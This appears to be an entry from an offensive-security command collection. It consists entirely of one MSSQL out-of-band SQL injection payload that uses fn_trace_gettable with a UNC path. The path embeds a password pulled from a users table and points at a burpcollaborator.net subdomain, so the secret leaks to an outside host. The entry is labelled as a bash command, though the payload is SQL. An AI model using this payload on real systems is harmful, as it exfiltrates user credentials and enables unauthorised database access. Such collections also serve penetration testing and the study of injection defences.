---
id: cb93cf5a-ecad-4bad-a336-88f7b1f0298c
name: Check if fn_trace_gettable is accessible
type: command
executor: bash
data: exists(select * from fn_trace_gettable('\\'%2b(select pass from users where
  id=1)%2b'.xxxx.burpcollaborator.net\1.trc',default))
output: null
created_at: '2023-04-06T03:56:34.004353+00:00'
updated_at: '2023-04-10T20:22:40.529149+00:00'
---

# Check if fn_trace_gettable is accessible

```bash
exists(select * from fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.trc',default))
```
